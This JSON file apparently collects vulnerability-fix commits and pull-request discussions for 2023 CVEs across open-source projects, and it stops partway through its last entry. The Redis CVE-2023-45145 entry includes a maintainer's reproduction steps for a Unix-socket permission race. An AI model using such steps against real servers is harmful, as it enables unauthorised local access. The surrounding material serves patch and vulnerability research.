{
    "2023": [
        {
            "cve-id": "CVE-2023-52284",
            "commit_url": "https://github.com/bytecodealliance/wasm-micro-runtime/commit/b2e668c08414c421718f73366c6c2222684eb828",
            "commit_msg": "Fix loader push_pop_frame_ref_offset",
            "commit_msg_words": 3,
            "other_info": "Fix loader push_pop_frame_ref_offset",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2023-35946",
            "commit_url": "https://github.com/gradle/gradle/commit/859eae2b2acf751ae7db3c9ffefe275aa5da0d5d",
            "commit_msg": "Fix dependency cache path traversal vulnerability\n\nGradle leverages the protection added to prevent ZipSlip for any path\ncomputation inside a Gradle cache.\n\nSee https://github.com/gradle/gradle/security/advisories/GHSA-2h6c-rv6q-494v",
            "commit_msg_words": 24,
            "other_info": "Merge release into master @bot-gradle test and merge I've triggered [a build](https://builds.gradle.org/viewQueued.html?itemId=67740347) for you. Click [here](https://ge.gradle.org/scans?search.buildOutcome=failure&amp;search.names=gitCommitId&amp;search.tags=CI&amp;search.values=0e09a0bd12a709e2da3c8aa682bf1e1e1bdf9e8e) to see all failures if there's any.",
            "pr_title_words": 4,
            "comments_words": 19,
            "total_other_info_words": 23
        },
        {
            "cve-id": "CVE-2023-27821",
            "commit_url": "https://github.com/vran-dev/databasir/commit/10482aa7819439b0b571b4fd2f1e092f428b7cdc",
            "commit_msg": "Fix spel expression injection vulnerability",
            "commit_msg_words": 5,
            "other_info": "Fix spel expression injection vulnerability thanks for your contribution",
            "pr_title_words": 5,
            "comments_words": 4,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2023-45897",
            "commit_url": "https://github.com/exfatprogs/exfatprogs/commit/4abc55e976573991e6a1117bb2b3711e59da07ae",
            "commit_msg": "exfat2img: fix out-of-bounds write in read_file_dentry_set\n\nif SecondaryCount is greater than (2 + the max number\nof File Name entries), writing to memory outside\nthe node->name could happen.\n\nReported-by: Yuezhang Mo <Yuezhang.Mo@sony.com>\nSigned-off-by: Hyunchul Lee <hyc.lee@gmail.com>\nSigned-off-by: Namjae Jeon <linkinjeon@kernel.org>",
            "commit_msg_words": 40,
            "other_info": "Merge exfat-next into mater branch",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2023-28096",
            "commit_url": "https://github.com/OpenSIPS/opensips/commit/417568707520af25ec5c5dd91da18e6db3649dcb",
            "commit_msg": "cJSON: fix memory leak on object parsing error\n\nIssue discovered during OpenSIPS Security Audit 2021/2022,\nby Alfred Farrugia & Sandro Gauci (Enable Security)\n\nhttps://github.com/OpenSIPS/opensips/security/advisories/GHSA-2mg2-g46r-j4qr",
            "commit_msg_words": 24,
            "other_info": "3.2",
            "pr_title_words": 1,
            "comments_words": 0,
            "total_other_info_words": 1
        },
        {
            "cve-id": "CVE-2023-50255",
            "commit_url": "https://github.com/linuxdeepin/deepin-compressor/commit/82f668c78c133873f5094cfab6e4eabc0b70e4b6",
            "commit_msg": "fix: Zip Path Traversal\n\nZip Path Traversal\n\nBug: https://pms.uniontech.com/bug-view-232873.html\n\nLog: Zip Path Traversal",
            "commit_msg_words": 13,
            "other_info": "fix: Zip Path Traversal [\u662f\u5426\u6ee1\u8db3\u517c\u5bb9\u6027\u8981\u6c42] Y\r\n[\u662f\u5426\u6ee1\u8db3commit\u63d0\u4ea4\u89c4\u8303] Y\r\n[\u662f\u5426\u6ee1\u8db3\u7f16\u7801\u89c4\u8303] Y\r\n[Review\u7ed3\u8bba] Pass\r\n[Fail\u539f\u56e0] N/A [\u662f\u5426\u6ee1\u8db3\u517c\u5bb9\u6027\u8981\u6c42] Y\r\n[\u662f\u5426\u6ee1\u8db3commit\u63d0\u4ea4\u89c4\u8303] Y\r\n[\u662f\u5426\u6ee1\u8db3\u7f16\u7801\u89c4\u8303] Y\r\n[Review\u7ed3\u8bba] Pass\r\n[Fail\u539f\u56e0] N/A /merge [APPROVALNOTIFIER] This PR is **NOT APPROVED**\n\nThis pull-request has been approved by: *<a href=\"https://github.com/linuxdeepin/deepin-compressor/pull/154#\" title=\"Author self-approved\">myk1343</a>*, *<a href=\"https://github.com/linuxdeepin/deepin-compressor/pull/154#pullrequestreview-1776646642\" title=\"Approved\">pengfeixx</a>*\n\n\nThe full list of commands accepted by this bot can be found [here](https://go.k8s.io/bot-commands?repo=linuxdeepin%2Fdeepin-compressor).\n\n<details open>\nNeeds approval from an approver in each of these files:\n\n- **[debian/deepin/OWNERS](https://github.com/linuxdeepin/deepin-compressor/blob/release/eagle/debian/deepin/OWNERS)**\n\nApprovers can indicate their approval by writing `/approve` in a comment\nApprovers can cancel approval by writing `/approve cancel` in a comment\n</details>\n<!-- META={\"approvers\":[]} -->",
            "pr_title_words": 4,
            "comments_words": 93,
            "total_other_info_words": 97
        },
        {
            "cve-id": "CVE-2023-44402",
            "commit_url": "https://github.com/electron/electron/commit/342cf186d98eee64a68382bc74382b2e6745eb61",
            "commit_msg": "fix: ensure app load is limited to real asar files when appropriate",
            "commit_msg_words": 12,
            "other_info": "fix: ensure app load is limited to real asar files when appropriate **No Release Notes** I have automatically backported this PR to \"27-x-y\",     please check out #39807 I have automatically backported this PR to \"26-x-y\",     please check out #39808 I have automatically backported this PR to \"25-x-y\",     please check out #39809 I have automatically backported this PR to \"24-x-y\",     please check out #39810 I have automatically backported this PR to \"22-x-y\",     please check out #39811 Hi @MarshallOfSound! It seems like this PR wasn't backported to `23.x.y`.\r\n\r\nIn https://github.com/advisories/GHSA-7m48-wc93-9g85, we can see that it should have been published as `23.3.14`, but that version doesn't exist \ud83e\udd14",
            "pr_title_words": 12,
            "comments_words": 93,
            "total_other_info_words": 105
        },
        {
            "cve-id": "CVE-2023-25826",
            "commit_url": "https://github.com/OpenTSDB/opentsdb/commit/26be40a5e5b6ce8b0b1e4686c4b0d7911e5d8a25",
            "commit_msg": "Improved fix for #2261.\nRegular expressions wouldn't catch the newlines or possibly other\ncontrol characters. Now we'll use the TAG validation code to make\nsure the inputs are only plain ASCII printables first.\nFixes CVE-2018-12972, CVE-2020-35476",
            "commit_msg_words": 36,
            "other_info": "Improved fix for #2261. @manolama - this seems to fix the [RCE we reported](https://github.com/OpenTSDB/opentsdb/issues/2261) before Synopsis on Dec 12, 2022. Seems like they have also issued a CVE for the vulnerability we found. Could you please open a Github security advisory? Thanks.",
            "pr_title_words": 4,
            "comments_words": 38,
            "total_other_info_words": 42
        },
        {
            "cve-id": "CVE-2023-29201",
            "commit_url": "https://github.com/xwiki/xwiki-commons/commit/b11eae9d82cb53f32962056b5faa73f3720c6182",
            "commit_msg": "XCOMMONS-1680: Filter Html attributes in restricted mode based on a whitelist\n\n* Add a SanitizerFilter that checks namespaces and filters elements\n  based on the HTMLElementSanitizer",
            "commit_msg_words": 25,
            "other_info": "XCOMMONS-2426: Provide a component for filtering safe HTML elements and attributes I've addressed all comments. For my taste this is still lacking a few more tests in particular with the new configuration options but feel free to have a look at the changes already. I've just pushed a rebase on the current master version and also an extension of the code to also allow SVG and MathML attributes and implemented [XCOMMONS-1680](https://jira.xwiki.org/browse/XCOMMONS-1680) based on this. I'll probably just change whole pull request to be about XCOMMONS-1680 and then just close XCOMMONS-2426 as implemented by XCOMMONS-1680. Further, I've decided to drop the \"permissive\" sanitizer option as I don't think this is maintainable. With the added configuration options, admins should be able to allow whatever attribute or element they need (and if they can't, we can add further options). I would still like to have more tests but I hope the remaining parts are already quite okay. \r\n\r\nI'm wondering if the sanitizer filter should force the secure sanitizer or if not, if it shouldn't check namespaces when the insecure sanitizer is used. Alternatively, we could also move the namespace check into the sanitizer but this is really quite specific to `HTMLCleaner` I think as in other cases you might also already have existing namespace information.",
            "pr_title_words": 11,
            "comments_words": 201,
            "total_other_info_words": 212
        },
        {
            "cve-id": "CVE-2023-34488",
            "commit_url": "https://github.com/nanomq/NanoNNG/commit/caf09f175a5e873a1256e0878a37865a8a06e427",
            "commit_msg": "* FIX [mqtt_parser] fix https://github.com/emqx/nanomq/issues/1181 in conn_handler",
            "commit_msg_words": 7,
            "other_info": "* FIX [mqtt_parser] fix https://github.com/emqx/nanomq/issues/1181 in\u2026",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2023-7158",
            "commit_url": "https://github.com/micropython/micropython/commit/f397a3ec318f3ad05aa287764ae7cef32202380f",
            "commit_msg": "py/objslice: Validate that the argument to indices() is an integer.\n\nOtherwise passing in a non-integer can lead to an invalid memory access.\n\nThanks to Junwha Hong and Wonil Jang @S2Lab, UNIST for finding the issue.\n\nFixes issue #13007.\n\nSigned-off-by: Damien George <damien@micropython.org>",
            "commit_msg_words": 42,
            "other_info": "py/objslice: Validate that the argument to indices() is an integer. Code size report:\n\n```\n   bare-arm:    +0 +0.000% \nminimal x86:    +0 +0.000% \n   unix x64:    +0 +0.000% standard\n      stm32:    +0 +0.000% PYBV10\n     mimxrt:    +0 +0.000% TEENSY40\n        rp2:    +0 +0.000% RPI_PICO\n       samd:    +0 +0.000% ADAFRUIT_ITSYBITSY_M4_EXPRESS\n\n```\n ## [Codecov](https://app.codecov.io/gh/micropython/micropython/pull/13039?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=micropython) Report\nAll modified and coverable lines are covered by tests :white_check_mark:\n> Comparison is base [(`fce8d9f`)](https://app.codecov.io/gh/micropython/micropython/commit/fce8d9fd55409ab1027beee5671bc653fb5beb97?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=micropython) 98.43% compared to head [(`f397a3e`)](https://app.codecov.io/gh/micropython/micropython/pull/13039?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=micropython) 98.43%.\n\n\n<details><summary>Additional details and impacted files</summary>\n\n\n```diff\n@@           Coverage Diff           @@\n##           master   #13039   +/-   ##\n=======================================\n  Coverage   98.43%   98.43%           \n=======================================\n  Files         158      158           \n  Lines       20978    20978           \n=======================================\n  Hits        20649    20649           \n  Misses        329      329           \n```\n\n\n\n</details>\n\n[:umbrella: View full report in Codecov by Sentry](https://app.codecov.io/gh/micropython/micropython/pull/13039?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=micropython).   \n:loudspeaker: Have feedback on the report? [Share it here](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=micropython).",
            "pr_title_words": 10,
            "comments_words": 109,
            "total_other_info_words": 119
        },
        {
            "cve-id": "CVE-2023-40183",
            "commit_url": "https://github.com/dataease/dataease/commit/826513053146721a2b3e09a9c9d3ea41f8f10569",
            "commit_msg": "fix: \u52a0\u5f3a\u56fe\u7247\u6821\u9a8c\uff0c\u9632\u6b62\u6076\u610f\u4ee3\u7801\u901a\u8fc7\u5408\u6210\u5230\u56fe\u7247\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u4e2d\u5f15\u8d77\u7684\u653b\u51fb\u884c\u4e3a",
            "commit_msg_words": 2,
            "other_info": "fix: \u52a0\u5f3a\u56fe\u7247\u6821\u9a8c\uff0c\u9632\u6b62\u6076\u610f\u4ee3\u7801\u901a\u8fc7\u5408\u6210\u5230\u56fe\u7247\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u4e2d\u5f15\u8d77\u7684\u653b\u51fb\u884c\u4e3a",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2023-33595",
            "commit_url": "https://github.com/python/cpython/commit/c120bc2d354ca3d27d0c7a53bf65574ddaabaf3a",
            "commit_msg": "Fix use-after-free in tokenizer.c\n\n`tok_get_fstring_mode`: ensure that token in the f-string middle is properly decoded, i.e. `tok_nextc` doesn't return EOF with `tok->decoding_erred` set to 1",
            "commit_msg_words": 25,
            "other_info": "gh-103824: fix use-after-free error in Parser/tokenizer.c",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2023-22671",
            "commit_url": "https://github.com/NationalSecurityAgency/ghidra/commit/1640b544c3d99b5ce8a89d9ca4b540da22be3a0e",
            "commit_msg": "GP-2987: No longer using eval in launch.sh",
            "commit_msg_words": 7,
            "other_info": "Removing `eval` usage from `launch.sh`",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2023-25155",
            "commit_url": "https://github.com/redis/redis/commit/2a2a582e7cd99ba3b531336b8bd41df2b566e619",
            "commit_msg": "Integer Overflow in RAND commands can lead to assertion (CVE-2023-25155)\n\nIssue happens when passing a negative long value that greater than\nthe max positive value that the long can store.",
            "commit_msg_words": 30,
            "other_info": "Release 7.0.9 freebsd cluster CI failed on `  08:53:20> Cluster is writable: FAILED: caught an error in the test No good startup node found.  127.0.0.1:30000: couldn't open socket: address already in use`.\r\nknown issue. CI failed on some jobs that are likely to be known CI issues. retrying...\r\n* macos redis test hang and got terminated by the runner\r\n* macos cluster test failed in 04-resharding.tcl\r\n* freebsd redis test failed in `min-slaves-to-write is ignored by slaves` with `NOREPLICAS Not enough good replicas to write.` another CI attempt:\r\n* freebsd failed on `[exception]: Executing test client: couldn't open socket: address already in use` (same as the first attempt in this PR).\r\n* macos CI decommissioned by the runner again. (a known issue)\r\n* macos cluster CI passed.",
            "pr_title_words": 2,
            "comments_words": 125,
            "total_other_info_words": 127
        },
        {
            "cve-id": "CVE-2023-38403",
            "commit_url": "https://github.com/esnet/iperf/commit/0ef151550d96cc4460f98832df84b4a1e87c65e9",
            "commit_msg": "Fix memory allocation hazard (#1542). (#1543)\n\nReported by:\t@someusername123 on GitHub",
            "commit_msg_words": 11,
            "other_info": "Fix memory allocation hazard (#1542). Thanks @someusername123 for the bug report! errr... it is okay here to not indent properly? shouldn't \"str =\" and following lines be indented one level more?",
            "pr_title_words": 5,
            "comments_words": 26,
            "total_other_info_words": 31
        },
        {
            "cve-id": "CVE-2023-3423",
            "commit_url": "https://github.com/CloudExplorer-Dev/CloudExplorer-Lite/commit/7d4dab60352079953b7be120afe9bd14983ae3bc",
            "commit_msg": "fix: \u7528\u6237\u4fee\u6539\u5bc6\u7801\u589e\u52a0\u540e\u7aef\u63a5\u53e3\u6821\u9a8c",
            "commit_msg_words": 2,
            "other_info": "fix: \u7528\u6237\u4fee\u6539\u5bc6\u7801\u589e\u52a0\u540e\u7aef\u63a5\u53e3\u6821\u9a8c GHSA-px4m-5j22-5mw4",
            "pr_title_words": 2,
            "comments_words": 1,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2023-42800",
            "commit_url": "https://github.com/moonlight-stream/moonlight-common-c/commit/24750d4b748fefa03d09fcfd6d45056faca354e0",
            "commit_msg": "Fix buffer overflow in performRtspHandshake (CVE-2023-42800)",
            "commit_msg_words": 6,
            "other_info": "Fix for buffer overflows in RTSP parsing",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2023-1523",
            "commit_url": "https://github.com/snapcore/snapd/commit/997dbfd5327d6e429f63ae7adc2bf2b31f070931",
            "commit_msg": "snap-seccomp-blacklist: also disallow the use of ioctl + TIOCLINUX\n\nFixes CVE-2023-1523\n\nSigned-off-by: Alex Murray <alex.murray@canonical.com>",
            "commit_msg_words": 15,
            "other_info": "many: introduce seccomp denylist to block ioctl with TIOCLINUX to fix CVE-2023-1523 ## [Codecov](https://app.codecov.io/gh/snapcore/snapd/pull/12849?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=snapcore) Report\n> Merging [#12849](https://app.codecov.io/gh/snapcore/snapd/pull/12849?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=snapcore) (371f7b5) into [master](https://app.codecov.io/gh/snapcore/snapd/commit/a91821c304d64b0967bcc893f0f363fcbcb52e9e?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=snapcore) (a91821c) will **increase** coverage by `0.00%`.\n> The diff coverage is `100.00%`.\n\n:exclamation: Your organization is not using the GitHub App Integration. As a result you may experience degraded service beginning May 15th. Please [install the Github App Integration](https://github.com/apps/codecov) for your organization. [Read more](https://about.codecov.io/blog/codecov-is-updating-its-github-integration/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=snapcore).\n\n```diff\n@@           Coverage Diff           @@\n##           master   #12849   +/-   ##\n=======================================\n  Coverage   78.60%   78.61%           \n=======================================\n  Files         990      991    +1     \n  Lines      122688   122768   +80     \n=======================================\n+ Hits        96443    96508   +65     \n- Misses      20176    20187   +11     \n- Partials     6069     6073    +4     \n```\n\n| Flag | Coverage \u0394 | |\n|---|---|---|\n| unittests | `78.61% <100.00%> (+<0.01%)` | :arrow_up: |\n\nFlags with carried forward coverage won't be shown. [Click here](https://docs.codecov.io/docs/carryforward-flags?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=snapcore#carryforward-flags-in-the-pull-request-comment) to find out more.\n\n| [Impacted Files](https://app.codecov.io/gh/snapcore/snapd/pull/12849?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=snapcore) | Coverage \u0394 | |\n|---|---|---|\n| [cmd/snap-seccomp/main.go](https://app.codecov.io/gh/snapcore/snapd/pull/12849?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=snapcore#diff-Y21kL3NuYXAtc2VjY29tcC9tYWluLmdv) | `63.38% <100.00%> (+0.88%)` | :arrow_up: |\n\n... and [6 files with indirect coverage changes](https://app.codecov.io/gh/snapcore/snapd/pull/12849/indirect-changes?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=snapcore)\n\n:mega: We\u2019re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=snapcore)\n Thanks for all the fixups @mvo5  spread tests look good - thanks again @mvo5 for fixing the various deficiencies in my code (we really need a way to get spread runs on private github forks so that we can test the other arches / platforms more easily before brining these changes public...) So just to clarify - I think we want to tweak this a bit but it's also working correctly and protecting from TIOCLINUX so it's fine to go in but for long term maintainence I think we need something slightly different in the near future.",
            "pr_title_words": 12,
            "comments_words": 262,
            "total_other_info_words": 274
        },
        {
            "cve-id": "CVE-2023-24819",
            "commit_url": "https://github.com/RIOT-OS/RIOT/commit/73615161c01fcfbbc7216cf502cabb12c1598ee4",
            "commit_msg": "gnrc_sixlowpan_iphc: fix buffer overflow in gnrc_sixlowpan_iphc_recv()",
            "commit_msg_words": 6,
            "other_info": "gnrc_sixlowpan: Various hardening fixes > Fragmentation and header compression (e.g. as outlined in Release Specs 4 and 6) should still work.\r\n\r\nSee ~~https://github.com/RIOT-OS/RIOT/actions/runs/3345458318~~ https://github.com/RIOT-OS/RIOT/actions/runs/3346308008 ### Murdock results\n\n:heavy_check_mark: [PASSED](https://ci-prod.riot-os.org/details/3313823edb804385a9968022dc6c9d82)\n\n3c7c9fefd61a57e25a08d6566ded64ca8c5326ae tests/unittests: fix get_frame_hdr_len tests for hardened parsing\n\n|  Success  |  Failures  |  Total  |  Runtime  |\n| :-------: | :--------: | :-----: | :-------: |\n| 2032 | 0 | 2032 | 09m:57s |\n\n\n#### Artifacts\n- [Documentation preview](https://ci-prod.riot-os.org/results/3313823edb804385a9968022dc6c9d82/doc-preview/)\n\n**This only reflects a subset of all builds from https://ci-prod.riot-os.org. Please refer to https://ci.riot-os.org for a complete build for now.**\n\n Would be great if someone(TM) could fix this randomly failing test... Mhhh fails pretty reliably on `ci-prod` :-/... but I can not reproduce this locally. Ok, release tests also fail for 6.6 (UDP without payload). Since this touches IPHC and NHC, I wager, this is a regression :-/. Will look into it. 1bbac1d5070e8f6347cd9390b337de7671716534 was at fault. This was only introduced after the previous discussion in reaction to the failing tests here. However, other fixes to the \"[gnrc_sixlowpan_iphc: fix buffer overflow in gnrc_sixlowpan_iphc_recv()](https://github.com/RIOT-OS/RIOT/pull/18817/commits/73615161c01fcfbbc7216cf502cabb12c1598ee4)\" commit, made that fix\r\n\r\n1. unnecessary\r\n2. introducing the error in `tests/gcoap_fileserver` and the release specs 6.6 test\r\n\r\nAs such, I just removed it. > 2\\. introducing the error in `tests/gcoap_fileserver`\r\n\r\n(I was able to reproduce it after all btw) Release tests are run here: https://github.com/RIOT-OS/RIOT/actions/runs/3346308008/jobs/5548696437 > Release tests are run here: https://github.com/RIOT-OS/RIOT/actions/runs/3346308008/jobs/5548696437\r\n\r\nSucceeded. Backport provided in #18820",
            "pr_title_words": 4,
            "comments_words": 225,
            "total_other_info_words": 229
        },
        {
            "cve-id": "CVE-2023-49285",
            "commit_url": "https://github.com/squid-cache/squid/commit/77b3fb4df0f126784d5fd4967c28ed40eb8d521b",
            "commit_msg": "RFC 1123: Fix date parsing (#1538)\n\nThe bug was discovered and detailed by Joshua Rogers at\nhttps://megamansec.github.io/Squid-Security-Audit/datetime-overflow.html\nwhere it was filed as \"1-Byte Buffer OverRead in RFC 1123 date/time\nHandling\".",
            "commit_msg_words": 30,
            "other_info": "v5 Next Backports",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2023-36328",
            "commit_url": "https://github.com/libtom/libtommath/commit/beba892bc0d4e4ded4d667ab1d2a94f4d75109a9",
            "commit_msg": "Fix possible integer overflow",
            "commit_msg_words": 4,
            "other_info": "Fix possible integer overflow @sjaeckel please ask the reporter of that bug if they want to remain anonymous. I would like to put their name in, otherwise. @gal1ium thanks for reporting this. Do you wanna have a look at the changes? > @gal1ium thanks for reporting this. Do you wanna have a look at the changes?\r\n\r\nI think they're good! Thanks! > I double checked and it looks good.\r\n\r\nNone forgotten? Good.\r\n\r\n> I also cherry-picked this to develop locally and will open a PR soon.\r\n\r\nAh, thanks, wasn't able to get to it till now.\r\n @dod38fr @scaronni @gahr @DimStar77 @dfandrich @antonio-rojas @millak\r\n\r\ncould you please include this patch in your distro? @sjaeckel I can do that - are you planning a patch release, anyway? Does this fix a security vulnerability? Glacing at the diff, it looks like it fixes some things that a buggy program might hit but affect parameters that would not generally be under the control of an attacker. > @dod38fr @scaronni @gahr @DimStar77 @dfandrich @antonio-rojas @Millak\r\n> \r\n> could you please include this patch in your distro?\r\n\r\nIt's too late for Debian 12 which is to be released next week. \r\n\r\nI'll patch libtommath in Debian/unstable once Debian 12 is out. If this bug turns out to be a security issue, I'll make sure to include in a future Debian 12 point release (e.g. 12.1). I patched the FreeBSD port: https://cgit.freebsd.org/ports/commit/?id=02c46239ac8dce1c3573803e6c95ae152aa61ee9\r\n\r\nstill eager to know if there's a release coming I don't think there will be a patch release, but a new release will come which includes this patch. CVE-2023-36328 was assigned to this.\r\n\r\nI had no involvement in the assignment, posting here for reference only. Seems like someone really thinks that this needs a bugfix release ...\r\n\r\nhttps://github.com/libtom/libtommath/releases/tag/v1.2.1 I see an error in the description https://nvd.nist.gov/vuln/detail/CVE-2023-36328#range-9994440 of the versions affected by the vulnerability. Version 1.2.1 is included, although it contains changes from this commit:\r\nhttps://github.com/libtom/libtommath/pull/546/commits/beba892bc0d4e4ded4d667ab1d2a94f4d75109a9\r\nCan you correct and remove version 1.2.1 from the nist.gov description? I contacted them, let's see what happens and when :-)  Version is fixed, list will be updated within the next 24hours It looks like CVE.\r\nI think that it would be good to release new version only because that commit.",
            "pr_title_words": 4,
            "comments_words": 366,
            "total_other_info_words": 370
        },
        {
            "cve-id": "CVE-2023-0341",
            "commit_url": "https://github.com/editorconfig/editorconfig-core-c/commit/41281ea82fbf24b060a9f69b9c5369350fb0529e",
            "commit_msg": "Fix potential buffer overflow in ec_glob (#87)\n\nCVE-2023-0341\r\n\r\nCo-authored-by: David Fernandez Gonzalez <david.fernandezgonzalez@canonical.com>",
            "commit_msg_words": 13,
            "other_info": "Fix potential buffer overflow in ec_glob",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2023-39975",
            "commit_url": "https://github.com/krb5/krb5/commit/88a1701b423c13991a8064feeb26952d3641d840",
            "commit_msg": "Fix double-free in KDC TGS processing\n\nWhen issuing a ticket for a TGS renew or validate request, copy only\nthe server field from the outer part of the header ticket to the new\nticket.  Copying the whole structure causes the enc_part pointer to be\naliased to the header ticket until krb5_encrypt_tkt_part() is called,\nresulting in a double-free if handle_authdata() fails.\n\n[ghudson@mit.edu: changed the fix to avoid aliasing enc_part rather\nthan check for aliasing before freeing; rewrote commit message]\n\nCVE-2023-39975:\n\nIn MIT krb5 release 1.21, an authenticated attacker can cause a KDC to\nfree the same pointer twice if it can induce a failure in\nauthorization data handling.\n\nticket: 9101 (new)\ntags: pullup\ntarget_version: 1.21-next",
            "commit_msg_words": 114,
            "other_info": "kdc: Fix double free in free_req_info() I pushed an alternative fix.  Please let me know if it fares any worse on tests for you.\r\n Looks fine for me, tests are passing and AddressSanitizer has nothing to complain.",
            "pr_title_words": 6,
            "comments_words": 31,
            "total_other_info_words": 37
        },
        {
            "cve-id": "CVE-2023-34620",
            "commit_url": "https://github.com/hjson/hjson-java/commit/00e3b1325cb6c2b80b347dbec9181fd17ce0a599",
            "commit_msg": "general fix",
            "commit_msg_words": 2,
            "other_info": "Fixing vulnerability CVE-2023-34620 in hjson library by adding the implementation of maximum depth while parsing input JSON. Thanks for you contribution! This only fixed the problem for objects, not for arrays, so I added a commit with a general fix. Fixes #23\r\nFixes #24",
            "pr_title_words": 17,
            "comments_words": 27,
            "total_other_info_words": 44
        },
        {
            "cve-id": "CVE-2023-31439",
            "commit_url": "https://github.com/systemd/systemd/commit/540e35ef8ae259744ce18d272a232d56c2445279",
            "commit_msg": "journalctl: verify that old entries are not sealed with too recent key\n\nWhen verifying seals produced with forward secure sealing, the verification\ncurrently does not check that old entries are only sealed with the key for\ntheir epoch and not a more recent one. This missing check allows an attacker\nto remove seals, and create new ones with the currently available key, and\nverify will claim everything is in order, although all entries could have\nbeen modified.\n\nThis resolves CVE-2023-31439.",
            "commit_msg_words": 80,
            "other_info": "journalctl: verify that old entries are not sealed with too recent key Hi there, can someone find the time to review this? I still consider log sealing a security feature and consequently this issue a security vulnerability. Thank you for the review, I incorporated all suggestions. Regarding `usec_t` and  `usec_add`: there are quite a few other timestamps in this method that still use plain addition and `uint64_t`, should I also adjust them to keep it consistent? Next time, please squash commits, rather than appending commits to address comments.",
            "pr_title_words": 12,
            "comments_words": 76,
            "total_other_info_words": 88
        },
        {
            "cve-id": "CVE-2023-48106",
            "commit_url": "https://github.com/zlib-ng/minizip-ng/commit/3920698d13681c35f2daf929c1c7f70f12d2ab13",
            "commit_msg": "Fix for filenames of the form \"x/../y\"\n\nhttps://github.com/zlib-ng/minizip-ng/issues/740",
            "commit_msg_words": 8,
            "other_info": "Fix for filenames of the form \"x/../y\"",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2023-45145",
            "commit_url": "https://github.com/redis/redis/commit/03345ddc7faf7af079485f2cbe5d17a1611cbce1",
            "commit_msg": "Fix issue of listen before chmod on Unix sockets (CVE-2023-45145) (#12671)\n\nBefore this commit, Unix socket setup performed chmod(2) on the socket\r\nfile after calling listen(2). Depending on what umask is used, this\r\ncould leave the file with the wrong permissions for a short period of\r\ntime. As a result, another process could exploit this race condition and\r\nestablish a connection that would otherwise not be possible.\r\n\r\nWe now make sure the socket permissions are set up prior to calling\r\nlisten(2).\r\n\r\n(cherry picked from commit 1119ecae6fd8796fa337df2212f09173ab6c7b0a)\r\n\r\nCo-authored-by: Yossi Gottlieb <yossigo@gmail.com>",
            "commit_msg_words": 90,
            "other_info": "Fix issue of listen before chmod on Unix sockets (CVE-2023-45145) released in 7.2.2, 7.0.14, and 6.2.14.\r\nthis PR is for unstable. Hello @oranagra is this applicable for docker Redis servers? It depends on the configuration. If a Unix socket is exposed outside the container then it could apply. Thanks @yossigo for confirmation. Hello,\r\nI'm currently developing a microservice application that utilizes multiple instance of Redis images. Specifically, I'm focusing on the area of intrusion attacks. Could you please provide guidance on how I can simulate and recreate such exploits locally? @PsychoPunkSage steps:\r\n1. use the code before the fix.\r\n2. change the code to:\r\n```\r\n    if (anetListen(err,s,(struct sockaddr*)&sa,sizeof(sa),backlog) == ANET_ERR)\r\n        return ANET_ERR;\r\n    usleep(10 * 1000 * 1000);\r\n    if (perm)\r\n        chmod(sa.sun_path, perm);\r\n```\r\n\r\n3. enable the config in the redis.conf\r\n```\r\nunixsocket /run/redis.sock\r\nunixsocketperm 700\r\n```\r\n\r\n4. run Redis with root\r\n5. run a redis-cli with non-root user before the end of `usleep` \r\n```\r\nredis-cli -s unixsocket /run/redis.sock\r\n```\r\n7. if you don't see `permission denied`, you success.",
            "pr_title_words": 10,
            "comments_words": 157,
            "total_other_info_words": 167
        },
        {
            "cve-id": "CVE-2023-45132",
            "commit_url": "https://github.com/wargio/naxsi/commit/1b712526ed3314dd6be7e8b0259eabda63c19537",
            "commit_msg": "Remove X-Forwarded-For header special processing (#103)\n\n* Change tests IgnoreCIDR/IgnoreIP with/without real_ip support\r\n* Remove X-Forwarding-For header special processing\r\n* Change tests IgnoreCIDR/IgnoreIP set_real_ip_from 127.0.0.1 for IPv6 (for IPv4 machine only)\r\n* Change tests IgnoreCIDR/IgnoreIP set_real_ip_from 127.0.0.1 and ::1/128 for IPv6",
